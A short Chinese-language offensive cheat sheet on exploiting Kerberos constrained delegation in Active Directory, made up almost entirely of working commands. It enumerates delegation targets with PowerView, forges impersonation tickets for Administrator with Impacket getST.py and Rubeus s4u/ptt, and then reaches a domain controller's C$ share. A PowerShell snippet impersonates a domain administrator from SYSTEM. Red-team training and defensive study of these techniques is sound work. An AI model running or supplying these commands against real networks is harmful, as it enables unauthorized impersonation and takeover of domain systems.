	请求允许我们利用委托配置的 Kerberos 票证，我们可以再次使用 Impackets getST.py 脚本
	参数-impersonate 标志并指定我们希望模拟的用户
	探测
	>Get-DomainComputer -TrustedToAuth | select -exp dnshostname
	发现服务
	>Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo
  ### 利用受约束的委托
  	Impacket
	>getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
	Rubeus
	>./Rubeus.exe tgtdeleg /nowrap # this ticket can be used with /ticket:...
	>./Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt
	>./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
	>dir \\dc.domain.com\c$
  ### 在资源上模拟域用户
	要求：
	配置有约束委派的计算机上的 SYSTEM 级别权限
	PS> [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
	PS> $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
	PS> $idToImpersonate.Impersonate()
	PS> [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
	PS> ls \\dc01.offense.local\c$